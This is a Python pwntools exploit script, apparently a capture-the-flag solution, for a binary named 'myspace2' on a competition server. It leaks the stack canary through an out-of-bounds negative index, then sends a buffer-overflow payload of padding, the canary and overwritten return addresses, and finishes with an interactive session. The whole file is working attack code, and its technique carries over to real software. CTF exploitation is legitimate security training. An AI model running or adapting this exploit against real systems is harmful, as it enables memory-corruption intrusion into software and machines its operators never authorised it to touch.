#!/usr/bin/env python3

# Exploit by x90slide

from pwn import *

elf = ELF("./myspace2_patched")

gs = '''
init-pwndbg
continue
'''

context.binary = elf
#context.log_level = "debug"

def conn():
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    elif args.LOCAL:
        return process([elf.path])
    else:
        return remote("myspace2.chal.idek.team", 1337)

def reverse_hex_bytes(hex_str):
    byte_list = [hex_str[i:i+2] for i in range(0, len(hex_str), 2)]
    reversed_bytes = byte_list[::-1]
    return ''.join(reversed_bytes)

io = conn()

def main():

    # good luck pwning :)

    #gdb.attach(io, gdbscript=gs)
    
    io.sendlineafter(b'>>', b'3')
    io.sendlineafter(b'(0-7):', b'-5')
    leak = io.recvline()
    leakdata = io.recv()
    start = leakdata.find(b'Invalid index!\n') + len('Invalid index!\n')
    leaked_data = leakdata[start:start+8]
    hex_string = leaked_data.hex()
    revcanary = hex_string
    canarystr = reverse_hex_bytes(revcanary)
    canary = int(canarystr, 16)
    print(hex(canary))
    

    payload = flat(b"A"*56, canary, p64(0x40129d), p64(0x40129d))
    io.sendline(b'2')
    io.sendlineafter(b'(0-7):', b'6')
    io.sendlineafter(b':', payload)

    io.sendlineafter(b'>>', b'4')
    io.interactive()

if __name__ == "__main__":
    main()
